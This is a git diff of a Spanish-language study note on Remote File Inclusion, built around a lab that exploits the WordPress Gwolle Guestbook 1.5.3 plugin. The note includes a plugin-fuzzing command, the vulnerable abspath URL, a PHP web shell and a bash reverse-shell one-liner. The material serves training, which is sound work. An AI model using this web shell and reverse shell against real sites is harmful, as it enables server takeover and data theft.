@@ -1,12 +1,22 @@
 # Remote File Inclusión (RFI)
 
-Tags: #RFI #OWASP #Explotacion
+Tags: #RFI #OWASP #Explotacion #WordPress #OWASP 
 
-La vulnerabilidad **Remote File Inclusion** (**RFI**) es una vulnerabilidad de seguridad en la que un atacante puede **incluir** **archivos remotos** en una aplicación web vulnerable. Esto puede permitir al atacante ejecutar código malicioso en el servidor web y comprometer el sistema.
+La vulnerabilidad **Remote File Inclusion (RFI)** ocurre cuando una aplicación permite **incluir archivos externos (remotos)** sin validar correctamente la entrada del usuario.  
+Esto puede dar lugar a la **ejecución de código malicioso** en el servidor.
 
-En un ataque de RFI, el atacante utiliza una entrada del usuario, como una URL o un campo de formulario, para incluir un archivo remoto en la solicitud. Si la aplicación web no valida adecuadamente estas entradas, procesará la solicitud y devolverá el contenido del archivo remoto al atacante.
+### Funcionamiento
 
-Un atacante puede utilizar esta vulnerabilidad para incluir archivos remotos maliciosos que contienen código malicioso, como virus o troyanos, o para ejecutar comandos en el servidor vulnerable. En algunos casos, el atacante puede dirigir la solicitud hacia un recurso PHP alojado en un servidor de su propiedad, lo que le brinda un mayor grado de control en el ataque.
+- El atacante manipula parámetros de entrada (ej. URL o formularios).
+- La aplicación descarga e incluye un archivo remoto proporcionado por el atacante.
+- El archivo remoto puede contener **código malicioso (PHP, scripts, backdoors, malware)**.
+
+### Riesgos
+
+- Ejecución remota de código en el servidor.
+- Instalación de **webshells** o backdoors.
+- Compromiso total del sistema.
+- Robo o manipulación de datos.
 
 A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando para practicar esta vulnerabilidad:
 
@@ -16,9 +26,9 @@ Asimismo, se os comparte el enlace directo para la descarga del plugin ‘**Gwol
 
 - [Gwolle Guestbook](https://es.wordpress.org/plugins/gwolle-gb/)
 
-```bash Add commentMore actions
+```bash
 # Este tipo de ataques son convenientes cuando:
-1. Podemos apuntar a un archivo php y este archivo interpreta ese lenguaje 
+1. Se puede apuntar a un archivo php y es interpretado 
 ```
 
 ## Enumeración de plugin en WP
@@ -26,7 +36,7 @@ Asimismo, se os comparte el enlace directo para la descarga del plugin ‘**Gwol
 ```bash 
 # Forma de descubrir los plugins existentes en un Wordpress
 
-❯ wfuzz -c --hc=404 -t 200 -w /usr/share/Seclists/Discovery/web-content/CMS/wp-plugins.fuzz.txt http://<IP>/FUZZ
+❯ wfuzz -c --hc=404 -t 200 -w /usr/share/web-content/CMS/wp-plugins.fuzz.txt http://<IP>/FUZZ
 
 	# c = Formato colorizado 
 	# hc = Hide Code 404
@@ -39,39 +49,32 @@ Asimismo, se os comparte el enlace directo para la descarga del plugin ‘**Gwol
 ```bash 
 # Esta vulnerabilidad de RFI se da en un Wordpress en la parte de su plugin 'Gwolle' 1.5.3
 
-❯ http://IP/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://<hacker_website>/
+❯ http://IP/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://hacker_website/
 ```
 
 ```bash 
-# Del lado del atacante debemos de tener un servidor http ejecutandose con el archivo a compartir
-
-❯ python3 -m http.server 80 
-```
-
-```bash 
-# Archivo malicioso a compartir 
-❯ wp-load.php 
+# Archivo malicioso a compartir llamado 'wp-load.php'  
 
 <?php 
 	system($_GET['cmd']);
+
 
 Notas:
 	1. Terminar el script de la siguiente manera '?>'
 ```
 
 ```bash 
-# Por lo que ahora en la URL al final debemos de agregar '&cmd=' ya que no podemos tener dos '?cmd=' en una misma URL
-
-?abspath=http://<hacker_website>/&cmd=whoami
-
-# Podemos agregar una revershell en la URL de la siguiente manera:
-❯ bash -c "bash -i >& /dev/tcp/IP/443 0>&1"
-	# El '&' debemos de urlencodearlo = %26
-❯ bash -c "bash -i >%26 /dev/tcp/IP/443 0>%261"
+❯ python3 -m http.server 80     # Compartir el archivo 
 ```
 
 ```bash 
-# Nos ponemos en escucha en nuestra maquina de atacante para recibir la revershell
-❯ nc -nlvp 443 
+# Por lo que ahora en la URL al final debemos de agregar '&cmd=' ya que no se puede tener dos '?cmd=' en una misma URL
+
+?abspath=http://<hacker_website>/&cmd=whoami
+
+
+# Podemos agregar una revershell en la URL de la siguiente manera:
+❯ bash -c "bash -i >& /dev/tcp/IP/443 0>&1"
+	# El '&' = %26 urlencodeado
 ```
 
